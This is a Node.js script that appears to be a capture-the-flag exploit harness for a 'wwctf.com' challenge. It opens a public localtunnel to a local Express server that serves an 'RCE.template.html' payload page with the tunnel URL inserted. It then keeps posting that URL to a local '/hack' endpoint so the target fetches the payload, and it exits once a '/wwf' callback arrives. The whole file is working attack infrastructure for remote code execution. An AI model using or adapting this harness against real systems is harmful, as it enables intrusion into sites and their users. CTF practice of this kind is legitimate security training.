const localtunnel = require('localtunnel');
const express = require('express');
const axios = require('axios');
const path = require('path');
const fs = require('fs');

const app = express();
const port = 8000;

app.use((req, res, next) => {
    console.log(`[LOG] Incoming request: ${req.method} ${req.originalUrl}`);
    if (req.originalUrl.startsWith("/wwf")) {
        process.exit(0);
    }
    next();
});

// Serve the RCE.template.html file, replacing <URL> with the tunnel URL
app.get('/rce', (req, res) => {
    fs.readFile(path.join(__dirname, 'RCE.template.html'), 'utf8', (err, data) => {
        if (err) {
            res.status(500).send('Error reading template file');
            return;
        }

        // Replace the <URL> placeholder with the tunnel URL
        if (tunnelUrl) {
            data = data.replace('<URL>', tunnelUrl);
        } else {
            data = data.replace('<URL>', 'Loading...');
        }

        res.send(data);
    });
});

// Start the server
const server = app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});

// Create the local tunnel
let tunnelUrl = null;
localtunnel(port, {}, async (err, tunnel) => {
    if (err) {
        console.error('Error creating tunnel:', err);
        process.exit(1);
    }

    tunnelUrl = tunnel.url;
    console.log(`Tunnel URL is: ${tunnelUrl}`);

    console.log('Waiting 10 seconds for tunnel to become responsive...');
    await new Promise(resolve => setTimeout(resolve, 10000));

    while (1) {
        try {
            const postData = {
                "url": "https://fake-easy-chall.wwctf.com",
                "path": [tunnelUrl + "/rce"],
                "flagPrefix": ""
            };

            await axios.post('http://localhost:3000/hack', postData);

        } catch (err) {
            console.error('Error making request to tunnel endpoint:', err);
        }

        console.log('Waiting 10 seconds to retry if need be...');
        await new Promise(resolve => setTimeout(resolve, 10000));
    }
});
